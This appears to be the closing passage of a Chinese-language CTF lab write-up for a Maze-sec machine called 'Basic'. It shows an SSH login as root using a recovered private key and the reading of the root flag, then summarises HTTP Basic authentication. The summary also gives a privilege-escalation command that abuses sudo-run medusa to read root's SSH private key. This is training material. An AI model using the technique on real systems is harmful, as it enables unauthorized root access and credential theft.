+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# ssh root@192.168.2.48 -i id_rsa<br>Linux Basic 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sun Jul  6 08:23:47 2025 from 192.168.3.94<br>root@Basic:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Basic:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-c065860911bb44a2483c096cbd203df9&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h1 id="1、Basic认证"><a href="#1、Basic认证" class="headerlink" title="1、Basic认证"></a>1、Basic认证</h1><p>在 HTTP 中，基本认证（Basic access authentication）是一种用来允许网页浏览器或其他客户端程序在请求时提供用户名和密码形式的身份凭证的一种登录验证方式。 在基本认证中，请求包含一个格式为 <code>Authorization: Basic &lt;credentials&gt;</code> 的头部字段，其中<code> credentials</code> 是用户名和密码的 Base64 编码，用一个冒号 <code>:</code> 连接。</p>
+<h1 id="2、提权-medusa"><a href="#2、提权-medusa" class="headerlink" title="2、提权-medusa"></a>2、提权-medusa</h1><p>medusa可以读取文件内容<br><code>sudo medusa -H /root/.ssh/id_rsa -u root -p root -M ssh</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Basic%E8%AE%A4%E8%AF%81/" class="print-no-link">#Basic认证</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-medusa/" class="print-no-link">#提权-medusa</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Basic</div>
+      <div>http://miao-sec.github.io/Maze-sec/Basic/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Maze-sec/Config/" title="Config">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Config</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/13max/" title="13max">
+                        <span class="hidden-mobile">13max</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
